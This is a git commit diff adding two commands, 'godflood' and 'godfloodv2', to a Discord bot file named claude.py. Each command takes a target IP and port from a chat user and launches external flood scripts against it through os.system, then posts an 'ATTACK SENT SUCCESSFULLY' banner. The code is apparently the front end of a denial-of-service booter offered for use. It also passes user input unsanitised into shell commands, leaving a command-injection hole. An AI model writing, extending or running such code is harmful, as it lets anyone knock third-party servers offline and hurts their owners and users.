e4adaf4f703e0cc721462af8716df391fe3db660
thunderstorm00713-coder <thunderstorm00713@gmail.com>
2026-08-21 00:40:58 +0600

    Update claude.py

--- claude.py
+++ claude.py
@@ -749,6 +749,58 @@ async def snmp(ctx, arg1):
         t1.start()
         await ctx.send(embed=embed)
 
+@client.command()
+
+async def godflood(ctx, arg1, arg2, arg3):
+    if arg1 == '1.1.1.1':
+        await ctx.send('You cant attack 1.1.1.1')
+        pass
+    else:
+        def attack():
+            os.system(f'python god-flood.py {arg1} {arg2} 65335 {arg3}')
+            os.system(f"")
+
+        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
+
+        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
+        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``GOD FLOOD``', value='**[𝗧𝗜𝗠𝗘]**: ``60 sec``', inline=False)
+        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Dibbo``' , inline=False)
+        embed.set_thumbnail(
+        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
+    
+        embed.set_footer(text="𝗗𝗶𝗯𝗯𝗼'𝘀 𝗟𝗮𝗶𝗿 | 𝗗𝗶𝗯𝗯𝗼")
+        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
+        t1 = threading.Thread(target=attack)
+
+        t1.start()
+        await ctx.send(embed=embed)
+
+@client.command()
+
+async def godfloodv2(ctx, arg1, arg2):
+    if arg1 == '1.1.1.1':
+        await ctx.send('You cant attack 1.1.1.1')
+        pass
+    else:
+        def attack():
+            os.system(f'python god-flood-v2.py {arg1} {arg2} 65335')
+            os.system(f"")
+
+        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
+
+        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
+        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``GOD FLOOD V2``', value='**[𝗧𝗜𝗠𝗘]**: ``60 sec``', inline=False)
+        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Dibbo``' , inline=False)
+        embed.set_thumbnail(
+        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
+    
+        embed.set_footer(text="𝗗𝗶𝗯𝗯𝗼'𝘀 𝗟𝗮𝗶𝗿 | 𝗗𝗶𝗯𝗯𝗼")
+        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
+        t1 = threading.Thread(target=attack)
+
+        t1.start()
+        await ctx.send(embed=embed)
+
 
 @client.command()
 
